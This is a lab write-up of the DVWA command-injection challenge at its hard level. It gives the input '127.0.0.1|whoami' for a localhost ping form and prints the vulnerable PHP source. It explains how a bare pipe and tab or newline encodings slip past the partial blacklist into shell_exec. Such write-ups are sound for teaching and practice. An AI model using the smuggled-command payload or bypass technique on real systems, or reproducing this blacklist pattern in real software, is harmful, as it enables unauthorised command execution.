# Command Injection – Hard

## Attack Steps

    1. Navigate to target page
        - http://localhost/dvwa/vulnerabilities/exec
    
    2. Enter the payload in the input field (note: no space after the pipe):

    ```bash 
    127.0.0.1|whoami
    ```
    - Click the Submit button.

    3. Observe the output: 
    - You should see the ping results, followed by the output of the injected command, e.g.:

    ```bash
    Pinging 127.0.0.1 with 32 bytes of data:
    Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
    ...

    dvwauser
    ```

## Vulnerable Code Analysis
### File:

`C:\xampp\htdocs\DVWA\vulnerabilities\exec\source\high.php` (or equivalent for Hard mode)

#### Key Vulnerability Points:
```php
<?php

if (isset($_POST['Submit'])) {
    // Get input
    $target = trim($_REQUEST['ip']);

    // Set blacklist
    $substitutions = array(
        '||' => '',
        '&'  => '',
        ';'  => '',
        '| ' => '',   // <-- Only pipe + space, not bare pipe
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
    );

    // Remove blacklisted sequences
    $target = str_replace(array_keys($substitutions), $substitutions, $target);

    // Determine OS and execute the ping command
    if (stristr(php_uname('s'), 'Windows NT')) {
        $cmd = shell_exec('ping ' . $target);
    } else {
        $cmd = shell_exec('ping -c 4 ' . $target);
    }

    echo "<pre>{$cmd}</pre>";
}
?>
```

## Explanation
- Partial blacklist (pipe + space only): The blacklist removes only the exact sequence "| ", not a bare "|". This allows 127.0.0.1|whoami to pass unchanged.
    ```php 
    $substitutions = array(
    // ...
    '| ' => '',   // matches only pipe followed by a literal space
    // ...
    );
    // ...
    $target = str_replace(array_keys($substitutions), $substitutions, $target);
    ```
- Other whitespace types (%09 tab, %0a newline) also bypass the filter.

- trim() only removes whitespace/control characters from the start and end of the string.
- It does not alter or inspect characters in the middle, so it cannot fix blacklist gaps.
    ```php 
    $target = trim($_REQUEST['ip']);
    ```

- The partially filtered user input is concatenated directly into a shell command. Shell metacharacters are interpreted by the shell.
    ```php
    $cmd = shell_exec('ping ' . $target);        // Windows
    // or
    $cmd = shell_exec('ping -c 4 ' . $target);   // *nix
    ```

- Causes: 
    - Blacklist errors 
    - Trim doesn't fully filter out whitespace characters 
